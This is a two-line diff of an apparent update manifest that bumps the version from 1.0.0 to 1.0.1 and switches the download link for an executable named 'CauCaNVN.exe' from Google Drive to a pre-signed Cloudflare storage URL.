@@ -1,2 +1,2 @@
-1.0.0
-https://drive.usercontent.google.com/download?id=1Zx4CzaIBCi4FyuErDFfPpXxG0PcqN4e3&export=download&authuser=0&confirm=t&uuid=d8dcbd39-7501-4278-adc1-e87d9d044b57&at=AN_67v1wGHjQG8wlDg3F0gAENOKs:1729718513083
+1.0.1
+https://upnow-prod.ff45e40d1a1c8f7e7de4e976d0c9e555.r2.cloudflarestorage.com/LZ59ujvuCHYxWCXgd1LV3cklZCZ2/21ee41da-360d-4755-81eb-3fc5c115edca?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=cdd12e35bbd220303957dc5603a4cc8e%2F20241026%2Fauto%2Fs3%2Faws4_request&X-Amz-Date=20241026T012400Z&X-Amz-Expires=43200&X-Amz-Signature=0a43a4ce9da2a2c132457d8f6eb11dd95d741a0ec5147301a4cc6abbd61c9d64&X-Amz-SignedHeaders=host&response-content-disposition=attachment%3B%20filename%3D%22CauCaNVN.exe%22
